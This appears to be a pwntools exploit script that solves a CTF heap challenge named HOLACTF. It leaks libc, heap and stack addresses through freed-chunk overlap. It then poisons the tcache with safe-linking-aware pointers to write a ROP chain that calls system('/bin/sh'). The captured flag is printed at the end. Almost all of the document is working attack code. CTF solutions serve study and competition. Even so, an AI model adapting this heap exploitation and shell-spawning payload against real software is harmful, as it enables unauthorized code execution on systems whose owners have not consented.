#!/usr/bin/env python3
from pwn import *

# context.terminal = ["tmux", "splitw", "-h"]
exe = ELF("./chall_patched")
libc_e = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
# context.log_level = 'debug'

gdbscript="""b*main+682
b*main+918"""

def run():
    if args.LOCAL:
        p = process([exe.path], aslr=False)
        gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote("127.0.0.1", 57802)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)

def add(idx, size, content):
    sna("> ", 1)
    sna(": ", idx)
    sna(": ", size)
    sa(": ", content)

def delete(idx):
    sna("> ", 2)
    sna(": ", idx)

def show(idx):
    sna("> ", 3)
    sna(": ", idx)

add(1, 0x500, b"B"*8)
add(2, 0x10, b"C"*8)
delete(1)
add(1, 0x500, b"1"*8)
show(1)
p.recvuntil(b"1"*8)
leak = u64(p.recvn(6).ljust(8, b"\x00"))
info(f"leak: {hex(leak)}")
libc = leak - 0x21ace0
info(f"libc: {hex(libc)}")
environ = libc + 0x222200
delete(2)
add(0, 0x100, b"C"*8)
add(1, 0x100, b"D"*8)
add(2, 0x100, b"E"*8)
add(3, 0x100, b"F"*8)
add(4, 0x100, b"G"*8)
add(5, 0x100, b"H"*8)
add(6, 0x100, b"I"*8)
add(7, 0x100, b"J"*8)
add(8, 0x100, b"K"*8)
add(9, 0x50, b"padding")
for i in range(0, 7):
    delete(i)


delete(8)
delete(7)
add(10, 0x100, b"chunk")
delete(8)

for i in range(0, 7):
    add(i, 0x100, str(i).encode())

delete(0)
add(9, 0x210, b"A"*272)
show(9)
p.recvuntil(b"A"*272)
heap = u64(p.recvn(5).ljust(8, b"\x00"))
info(f"heap: {hex(heap)}")
delete(9)

add(9, 0x210, b"A"*256 + p64(0) +p64(0x111))
add(8, 0x100, b"concac")
delete(1)
delete(8)
delete(9)

payload = b"A"*256 + p64(0) +p64(0x111) + (p64((environ-0x10) ^ heap))
add(9, 0x210, payload)

add(8, 0x100, b"concac")
add(7, 0x100, b"A"*0x10)
show(7)
p.recvuntil(b"A"*0x10)
stack = u64(p.recvn(6).ljust(8, b"\x00"))
info(f"stack: {hex(stack)}")
ret = stack - 360 - 0x20

delete(2)
delete(8)
delete(9)
payload = b"A"*256 + p64(0) +p64(0x111) + (p64((ret) ^ heap))
add(9, 0x210, payload)

add(8, 0x100, b"abcdef")
rop = ROP(libc_e)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + libc
binsh = next(libc_e.search(b"/bin/sh")) + libc
system = libc_e.sym["system"] + libc
payload = b"0"*40 + p64(pop_rdi) + p64(binsh) + p64(pop_rdi+1) +p64(system)
add(3, 0x100, payload)
p.interactive()

#HOLACTF{hOUsE_Of_bOTC4k3_?_7e58d22741e2}